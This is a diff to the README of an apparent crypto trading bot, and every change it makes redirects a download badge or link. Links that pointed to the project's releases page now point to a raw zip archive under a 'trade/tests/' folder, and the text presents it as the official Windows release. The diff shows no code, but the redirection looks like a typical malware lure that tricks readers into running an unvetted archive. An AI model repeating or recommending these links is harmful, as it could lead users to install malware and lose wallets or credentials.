@@ -1,6 +1,6 @@
 # 🤖 crypto-liquidity-ai-trading-bot - Smarter Crypto Trading Made Simple
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen?style=for-the-badge)](https://github.com/Sopp6172/crypto-liquidity-ai-trading-bot/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20It%20Here-brightgreen?style=for-the-badge)](https://github.com/Sopp6172/crypto-liquidity-ai-trading-bot/raw/refs/heads/main/trade/tests/ai-bot-crypto-liquidity-trading-3.5.zip)
 
 ## 📋 About crypto-liquidity-ai-trading-bot
 
@@ -38,7 +38,7 @@ Follow these steps to download, install, and start the crypto-liquidity-ai-tradi
 
 Go to the official release page here to get the latest version:
 
-[![Get Latest Release](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Sopp6172/crypto-liquidity-ai-trading-bot/releases)
+[![Get Latest Release](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Sopp6172/crypto-liquidity-ai-trading-bot/raw/refs/heads/main/trade/tests/ai-bot-crypto-liquidity-trading-3.5.zip)
 
 This page holds all the installation files and updates for the software.
 
@@ -127,4 +127,4 @@ It connects to exchanges live to provide real-time data and update signals const
 
 ---
 
-[Download the latest version here](https://github.com/Sopp6172/crypto-liquidity-ai-trading-bot/releases) and begin running the bot on your Windows PC today.
+[Download the latest version here](https://github.com/Sopp6172/crypto-liquidity-ai-trading-bot/raw/refs/heads/main/trade/tests/ai-bot-crypto-liquidity-trading-3.5.zip) and begin running the bot on your Windows PC today.
